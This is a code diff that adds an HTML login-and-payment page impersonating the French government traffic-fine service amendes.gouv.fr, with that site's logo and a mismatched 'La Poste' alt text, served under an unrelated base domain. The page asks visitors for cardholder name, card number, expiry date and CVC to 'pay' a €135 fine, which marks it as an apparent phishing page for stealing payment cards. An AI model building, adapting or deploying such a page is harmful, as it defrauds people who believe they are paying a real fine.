@@ -1,0 +1,73 @@
+<!DOCTYPE html><html><head>
+	<base href="https://particulier.acces-sap.fr/login"/><meta charset="UTF-8"/><meta name="viewport" content="initial-scale=1, maximum-scale=1"/>
+	<title>Log in!</title>
+	<link href="/build/app.a88ea51b.css" rel="stylesheet"/>
+	<link href="https://fonts.googleapis.com/css?family=Montserrat:400,500,600,700,800,900&amp;display=swap" rel="stylesheet"/>
+	<link href="https://www.amendes.gouv.fr/assets/img/design/logo-amendes-gouv.svg" rel="icon" type="image/x-icon"/>
+	<link href="/build/tooltipster/css/tooltipster.bundle.min.css" rel="stylesheet"/>
+	<link href="/build/tooltipster/css/tooltipster.main.min.css" rel="stylesheet"/>
+	<link href="/build/tooltipster/css/plugins/tooltipster/sideTip/themes/tooltipster-sideTip-light.min.css" rel="stylesheet"/>
+	<style type="text/css">.error_list li {
+                display: inline;
+                color: red;
+                font-weight: initial;
+            }
+	</style>
+	<!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+
+                new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+
+            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+
+            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+
+        })(window,document,'script','dataLayer','GTM-PVKBSM2');</script><!-- End Google Tag Manager -->
+</head>
+<body>
+<header class="screen-header">
+<div class="col-12 col-md-9 auth__panel"><img alt="Logo La Poste" aria-hidden="true" class="logo" src="https://www.amendes.gouv.fr/assets/img/design/logo-amendes-gouv.svg" style="border-width: 0px; border-style: solid; margin: 50px; width: 261px; height: 100px;"/></div>
+
+<div class="title-end-line">
+<hr/>
+<p> </p>
+</div>
+</header>
+
+<div class="container-fluid">
+<div class="col-12 col-md-9 auth__panel">
+<div class="auth__title mt-4"> </div>
+
+<div class="d-flex flex-column auth__content ">
+<div class="auth__form ">
+<div class="alert-container position-absolute align-top"> </div>
+
+<form action="" class="card-unprocessed" id="payment-form" method="post" onsubmit="return vcmcCheckForm(this, true);"><input name="__original_url" type="hidden" value="toto"/>
+<div class="card-details">
+<div class="box-input"><input autocomplete="ccname" class="form-control" data-min-length="2" id="cardholder" name="cardholder" placeholder=" " required="" type="text"/> <label class="ml_txt" for="cardholder" id="fld_label_cardholder">Titulaire de la carte</label></div>
+
+<div class="box-input"><input autocomplete="cc-number" autocorrect="off" class="form-control" data-format="0000 0000 0000 0000 000" data-max-length="19" data-min-length="12" data-name="cardnumber" id="cardnumber" name="cardnumber" pattern="[\d ]*" placeholder="0000 0000 0000 0000" required="" type="tel" x-autocompletetype="cc-number"/> <label class="ml_txt" data-name="cardnumber" for="cardnumber" id="fld_label_cardnumber">Numéro de carte</label>
+
+<div id="data-brand-icon"> </div>
+</div>
+
+<div class="box-input-double">
+<div class="box-input"><input autocomplete="cc-exp-month" name="valid_thru_month" type="hidden" x-autocompletetype="cc-exp-month"/> <input autocomplete="cc-exp-year" name="valid_thru_year" type="hidden" x-autocompletetype="cc-exp-year"/> <input autocomplete="cc-exp" autocorrect="off" class="input" data-format="00/00" data-min-length="4" data-name="cc-expiration-date" id="valid_thru" maxlength="5" name="valid_thru" pattern="[\d/]*" placeholder="00/00" required="" type="tel"/> <label class="ml_txt" data-name="cc-expiration-date" for="valid_thru" id="fld_label_validthru_pattern">MM/YY</label></div>
+
+<div class="box-input"><input autocomplete="cc-csc" autocorrect="off" data-format="000" data-min-length="3" data-name="ccv-code" id="cardcvc" name="cardcvc" placeholder="000" type="tel"/> <label class="input-cvv-creditcard" data-name="ccv-code" data-type="card-cvv" for="cardcvc">CVC</label>
+
+<div class="cvc-info-container">
+<div class="cvc-info"><span class="ml_txt" id="cvc_info">You will find the three-digit CVC number of your Visa or Mastercard on the back of the card. On American Express cards this four-digit CVC number is printed on the front of your card.</span></div>
+</div>
+</div>
+</div>
+
+<div id="footer"><button class="button form-buttons-process pay-button-background-color pay-button-border-color pay-button-text-color" onclick="return psSubmit(&#39;true&#39;);"><span class="ml_txt pay-button-text-color" id="button_do_pay">Payer </span> <span class="pay-button-text-color"> € 135,00 </span></button></div>
+</div>
+</form>
+</div>
+</div>
+</div>
+</div>
+
+
+</body></html>
